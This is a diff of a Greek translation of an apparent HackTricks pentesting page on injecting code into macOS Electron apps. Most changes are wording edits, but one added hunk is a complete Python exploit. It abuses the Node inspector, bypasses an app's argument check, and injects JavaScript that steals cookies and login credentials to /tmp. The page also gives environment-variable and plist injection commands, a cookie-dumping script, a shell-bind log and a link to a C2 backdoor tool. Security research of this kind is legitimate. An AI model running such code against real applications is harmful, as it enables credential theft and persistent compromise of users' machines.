@@ -5,21 +5,21 @@
 ## Basic Information
 
 Αν δεν ξέρετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Αλλά προς το παρόν, απλά να ξέρετε ότι το Electron τρέχει **node**.\
-Και το node έχει κάποιες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελούν άλλο κώδικα** εκτός από το υποδεικνυόμενο αρχείο.
+Και το node έχει κάποιες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλο κώδικα** εκτός από το υποδεικνυόμενο αρχείο.
 
 ### Electron Fuses
 
-Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά πρόσφατα το Electron έχει προσθέσει αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι οι οποίες χρησιμοποιούνται για να **αποτρέπουν** τις εφαρμογές Electron στο macOS από το **να φορτώνουν αυθαίρετο κώδικα**:
+Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά πρόσφατα το Electron έχει προσθέσει αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι οι οποίες χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron στο macOS από το **να φορτώνουν αυθαίρετο κώδικα**:
 
 - **`RunAsNode`**: Αν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την έγχυση κώδικα.
-- **`EnableNodeCliInspectArguments`**: Αν είναι απενεργοποιημένο, παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα γίνονται σεβαστοί. Αποφεύγοντας αυτόν τον τρόπο για να εγχέεται κώδικας.
-- **`EnableEmbeddedAsarIntegrityValidation`**: Αν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα **επικυρώνεται** από το macOS. **Αποτρέποντας** με αυτόν τον τρόπο **την έγχυση κώδικα** τροποποιώντας τα περιεχόμενα αυτού του αρχείου.
+- **`EnableNodeCliInspectArguments`**: Αν είναι απενεργοποιημένο, παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα γίνουν σεβαστοί. Αποφεύγοντας αυτόν τον τρόπο για να εγχέουν κώδικα.
+- **`EnableEmbeddedAsarIntegrityValidation`**: Αν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα **επικυρωθεί** από το macOS. **Αποτρέποντας** με αυτόν τον τρόπο **την έγχυση κώδικα** τροποποιώντας τα περιεχόμενα αυτού του αρχείου.
 - **`OnlyLoadAppFromAsar`**: Αν αυτό είναι ενεργοποιημένο, αντί να ψάχνει να φορτώσει με την εξής σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγξει και θα χρησιμοποιήσει μόνο το app.asar, διασφαλίζοντας έτσι ότι όταν **συνδυάζεται** με τη σημαία **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να **φορτωθεί μη επικυρωμένος κώδικας**.
 - **`LoadBrowserProcessSpecificV8Snapshot`**: Αν είναι ενεργοποιημένο, η διαδικασία του προγράμματος περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το V8 snapshot της.
 
 Μια άλλη ενδιαφέρουσα σημαία που δεν θα αποτρέπει την έγχυση κώδικα είναι:
 
-- **EnableCookieEncryption**: Αν είναι ενεργοποιημένο, το cookie store στον δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογραφίας επιπέδου OS.
+- **EnableCookieEncryption**: Αν είναι ενεργοποιημένο, το cookie store στον δίσκο είναι κρυπτογραφημένο χρησιμοποιώντας κλειδιά κρυπτογραφίας επιπέδου OS.
 
 ### Checking Electron Fuses
 
@@ -46,11 +46,11 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε την προηγούμενη συμβολοσειρά. Μετά από αυτή τη συμβολοσειρά μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδεικνύει αν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλώς τροποποιήστε τον κωδικό hex (`0x30` είναι `0` και `0x31` είναι `1`) για να **τροποποιήσετε τις τιμές ασφάλειας**.
+Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε την προηγούμενη συμβολοσειρά. Μετά από αυτή τη συμβολοσειρά μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδεικνύει αν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι `0` και `0x31` είναι `1`) για **να τροποποιήσετε τις τιμές ασφάλειας**.
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Σημειώστε ότι αν προσπαθήσετε να **επικαλύψετε** το **`Electron Framework`** δυαδικό αρχείο μέσα σε μια εφαρμογή με αυτές τις τροποποιημένες bytes, η εφαρμογή δεν θα εκτελείται.
+Σημειώστε ότι αν προσπαθήσετε να **επικαλύψετε** το **`Electron Framework`** δυαδικό αρχείο μέσα σε μια εφαρμογή με αυτούς τους τροποποιημένους byte, η εφαρμογή δεν θα εκτελείται.
 
 ## RCE προσθήκη κώδικα σε εφαρμογές Electron
 
@@ -64,7 +64,7 @@ Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions
 >
 > Κάνοντάς το αυτό το μονοπάτι επίθεσης πιο περίπλοκο (ή αδύνατο).
 
-Σημειώστε ότι είναι δυνατόν να παρακαμφθεί η απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε άλλο φάκελο (όπως **`/tmp`**), μετονομάζοντας το φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το πίσω σε **`app.app/Contents`** και εκτελώντας το.
+Σημειώστε ότι είναι δυνατόν να παρακαμφθεί η απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε άλλο κατάλογο (όπως **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το πίσω σε **`app.app/Contents`** και εκτελώντας το.
 
 Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
 ```bash
@@ -74,9 +74,9 @@ npx asar extract app.asar app-decomp
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
-## RCE με `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+## RCE με ELECTRON_RUN_AS_NODE
 
-Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), αν αυτή η μεταβλητή περιβάλλοντος είναι ρυθμισμένη, θα ξεκινήσει τη διαδικασία ως κανονική διαδικασία Node.js.
+Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), αν αυτή η μεταβλητή περιβάλλοντος είναι ρυθμισμένη, θα ξεκινήσει τη διαδικασία ως μια κανονική διαδικασία Node.js.
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -84,7 +84,7 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> Αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.
+> Αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί, και αυτό δεν θα λειτουργήσει.
 
 ### Εισαγωγή από το App Plist
 
@@ -154,14 +154,222 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
+Σε [**αυτήν την ανάρτηση**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση εκμεταλλεύεται για να κάνει ένα headless chrome **να κατεβάσει αυθαίρετα αρχεία σε αυθαίρετες τοποθεσίες**.
+
+> [!TIP]
+> Αν μια εφαρμογή έχει τον δικό της τρόπο να ελέγχει αν οι μεταβλητές περιβάλλοντος ή οι παράμετροι όπως το `--inspect` είναι ρυθμισμένες, θα μπορούσατε να προσπαθήσετε να **παρακάμψετε** αυτό κατά την εκτέλεση χρησιμοποιώντας την παράμετρο `--inspect-brk`, η οποία θα **σταματήσει την εκτέλεση** στην αρχή της εφαρμογής και θα εκτελέσει μια παράκαμψη (υπεργράφοντας τις παραμέτρους ή τις μεταβλητές περιβάλλοντος της τρέχουσας διαδικασίας, για παράδειγμα).
+
+Ακολουθούσε μια εκμετάλλευση που παρακολουθώντας και εκτελώντας την εφαρμογή με την παράμετρο `--inspect-brk`, ήταν δυνατό να παρακαμφθεί η προσαρμοσμένη προστασία που είχε (υπεργράφοντας τις παραμέτρους της διαδικασίας για να αφαιρεθεί το `--inspect-brk`) και στη συνέχεια να εισαχθεί ένα JS payload για να απορριφθούν τα cookies και τα διαπιστευτήρια από την εφαρμογή:
+```python
+import asyncio
+import websockets
+import json
+import requests
+import os
+import psutil
+from time import sleep
+
+INSPECT_URL = None
+CONT = 0
+CONTEXT_ID = None
+NAME = None
+UNIQUE_ID = None
+
+JS_PAYLOADS = """
+var { webContents } = require('electron');
+var fs = require('fs');
+
+var wc = webContents.getAllWebContents()[0]
+
+
+function writeToFile(filePath, content) {
+const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
+
+fs.writeFile(filePath, data, (err) => {
+if (err) {
+console.error(`Error writing to file ${filePath}:`, err);
+} else {
+console.log(`File written successfully at ${filePath}`);
+}
+});
+}
+
+function get_cookies() {
+intervalIdCookies = setInterval(() => {
+console.log("Checking cookies...");
+wc.session.cookies.get({})
+.then((cookies) => {
+tokenCookie = cookies.find(cookie => cookie.name === "token");
+if (tokenCookie){
+writeToFile("/tmp/cookies.txt", cookies);
+clearInterval(intervalIdCookies);
+wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
+}
+})
+}, 1000);
+}
+
+function get_creds() {
+in_location = false;
+intervalIdCreds = setInterval(() => {
+if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
+in_location = true;
+console.log("Injecting creds logger...");
+wc.executeJavaScript(`
+(function() {
+email = document.getElementById('login_email_id');
+password = document.getElementById('login_password_id');
+if (password && email) {
+return email.value+":"+password.value;
+}
+})();
+`).then(result => {
+writeToFile("/tmp/victim_credentials.txt", result);
+})
+}
+else if (in_location) {
+wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
+clearInterval(intervalIdCreds);
+}
+}, 10); // Check every 10ms
+setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
+}
+
+get_cookies();
+get_creds();
+console.log("Payloads injected");
+"""
+
+async def get_debugger_url():
+"""
+Fetch the local inspector's WebSocket URL from the JSON endpoint.
+Assumes there's exactly one debug target.
+"""
+global INSPECT_URL
+
+url = "http://127.0.0.1:9229/json"
+response = requests.get(url)
+data = response.json()
+if not data:
+raise RuntimeError("No debug targets found on port 9229.")
+# data[0] should contain an object with "webSocketDebuggerUrl"
+ws_url = data[0].get("webSocketDebuggerUrl")
+if not ws_url:
+raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
+INSPECT_URL = ws_url
+
+
+async def monitor_victim():
+print("Monitoring victim process...")
+found = False
+while not found:
+sleep(1)  # Check every second
+for process in psutil.process_iter(attrs=['pid', 'name']):
+try:
+# Check if the process name contains "victim"
+if process.info['name'] and 'victim' in process.info['name']:
+found = True
+print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
+os.kill(process.info['pid'], 9)  # Force kill the process
+except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+# Handle processes that might have terminated or are inaccessible
+pass
+os.system("open /Applications/victim.app --args --inspect-brk")
+
+async def bypass_protections():
+global CONTEXT_ID, NAME, UNIQUE_ID
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+
+sleep(1)
+
+await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})
+
+await send_cmd(ws, "Profiler.enable")
+
+await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})
+
+await send_cmd(ws, "Runtime.runIfWaitingForDebugger")
+
+await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})
+
+code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
+print("Injected code to bypass protections")
+
+
+async def js_payloads():
+global CONT, CONTEXT_ID, NAME, UNIQUE_ID
+
+print(f"Connecting to {INSPECT_URL} ...")
+
+async with websockets.connect(INSPECT_URL) as ws:
+data = await send_cmd(ws, "Runtime.enable", get_first=True)
+CONTEXT_ID = data["params"]["context"]["id"]
+NAME = data["params"]["context"]["name"]
+UNIQUE_ID = data["params"]["context"]["uniqueId"]
+await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
+await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})
+
+
+
+async def main():
+await monitor_victim()
+sleep(3)
+await get_debugger_url()
+await bypass_protections()
+
+sleep(7)
+
+await js_payloads()
+
+
+
+async def send_cmd(ws, method, get_first=False, params={}):
+"""
+Send a command to the inspector and read until we get a response with matching "id".
+"""
+global CONT
+
+CONT += 1
+
+# Send the command
+await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
+sleep(0.4)
+
+# Read messages until we get our command result
+while True:
+response = await ws.recv()
+data = json.loads(response)
+
+# Print for debugging
+print(f"[{method} / {CONT}] ->", data)
+
+if get_first:
+return data
+
+# If this message is a response to our command (by matching "id"), break
+if data.get("id") == CONT:
+return data
+
+# Otherwise it's an event or unrelated message; keep reading
+
+if __name__ == "__main__":
+asyncio.run(main())
+```
 > [!CAUTION]
-> Αν η ασφάλεια **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοήσει τις παραμέτρους node** (όπως `--inspect`) κατά την εκκίνηση, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.
+> Αν η ασφάλεια **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοήσει τις παραμέτρους node** (όπως `--inspect`) όταν εκκινείται, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ρυθμισμένη, η οποία θα **αγνοηθεί** επίσης αν η ασφάλεια **`RunAsNode`** είναι απενεργοποιημένη.
 >
-> Ωστόσο, μπορείτε να χρησιμοποιήσετε την παράμετρο **`--remote-debugging-port=9229`** αλλά το προηγούμενο payload δεν θα λειτουργήσει για την εκτέλεση άλλων διαδικασιών.
+> Ωστόσο, μπορείτε να χρησιμοποιήσετε την **παράμετρο electron `--remote-debugging-port=9229`** αλλά το προηγούμενο payload δεν θα λειτουργήσει για την εκτέλεση άλλων διαδικασιών.
 
-Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατό να κλέψετε κάποιες πληροφορίες από την εφαρμογή Electron όπως το **ιστορικό** (με εντολές GET) ή τα **cookies** του προγράμματος περιήγησης (καθώς είναι **αποκρυπτογραφημένα** μέσα στο πρόγραμμα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).
+Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε κάποιες πληροφορίες από την εφαρμογή Electron όπως το **ιστορικό** (με εντολές GET) ή τα **cookies** του προγράμματος περιήγησης (καθώς είναι **αποκρυπτογραφημένα** μέσα στο πρόγραμμα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).
 
-Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό script όπως:
+Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό σενάριο όπως:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -169,11 +377,9 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-Σε [**αυτήν την ανάρτηση**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση κακοποιείται για να κάνει ένα headless chrome **να κατεβάζει αυθαίρετα αρχεία σε αυθαίρετες τοποθεσίες**.
+### Injection from the App Plist
 
-### Εισαγωγή από το App Plist
-
-Μπορείτε να κακοποιήσετε αυτήν την env μεταβλητή σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
+Μπορείτε να εκμεταλλευτείτε αυτήν την env μεταβλητή σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -194,10 +400,12 @@ print(ws.recv()
 
 ## Run non JS Code
 
-Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **κώδικα JS μέσα στη διαδικασία της εφαρμογής electron**. Ωστόσο, θυμηθείτε ότι οι **παιδικές διαδικασίες εκτελούνται υπό το ίδιο προφίλ sandbox** με την κύρια εφαρμογή και **κληρονομούν τα δικαιώματα TCC τους**.\
+Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **κώδικα JS μέσα στη διαδικασία της εφαρμογής electron**. Ωστόσο, θυμηθείτε ότι οι **παιδικές διαδικασίες εκτελούνται υπό το ίδιο προφίλ sandbox** με την γονική εφαρμογή και **κληρονομούν τα δικαιώματα TCC τους**.\
 Επομένως, αν θέλετε να εκμεταλλευτείτε τα δικαιώματα για να αποκτήσετε πρόσβαση στην κάμερα ή το μικρόφωνο, για παράδειγμα, μπορείτε απλά να **εκτελέσετε ένα άλλο δυαδικό από τη διαδικασία**.
 
 ## Automatic Injection
+
+- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)
 
 Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **βρείτε ευάλωτες εφαρμογές electron** που είναι εγκατεστημένες και να εισάγετε κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:
 
@@ -237,6 +445,11 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
+- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)
+
+Το Loki σχεδιάστηκε για να δημιουργεί backdoor σε εφαρμογές Electron αντικαθιστώντας τα αρχεία JavaScript των εφαρμογών με τα αρχεία JavaScript του Loki Command & Control.
+
+
 ## Αναφορές
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
